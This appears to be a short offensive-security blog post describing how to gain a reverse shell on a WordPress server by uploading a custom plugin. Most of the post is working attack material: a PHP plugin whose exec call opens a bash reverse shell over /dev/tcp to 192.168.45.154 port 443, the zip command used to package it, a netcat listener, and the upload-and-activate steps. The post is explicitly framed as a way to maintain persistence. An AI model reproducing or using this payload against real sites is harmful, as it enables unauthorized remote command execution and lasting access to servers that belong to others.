---
layout: post
title: WordPress Plugin Reverse Shell
titledate: 08/26/23
tags: ["infosec","offsec", "web", "wordpress","exploit","shell"]
---

[WordPress  Plugin Reverse Shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)

To upload our own plugin we need access to the WordPress Dashboard. We would drop the plugin in the wp-content/plugins folder if we were on the server.

Having the webshell would allow us to maintain persistence by storing our code in the WordPress application

```php
<?php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.154/443 0>&1'");
?>
```
To upload a WP plugin we need to zip it

    $ zip rshll-plugin.zip ./rshll-plugin.php

Before we upload the plugin we need to start a reverse listener with NC

    $ nc -lvp 443

Next we Upload via the WP UI - Plugins - Upload Plugin - Browse - Activate Plugin

w00t

![_config.yml]({{ site.baseurl }}/images/web/wp_plugin_shell.png)

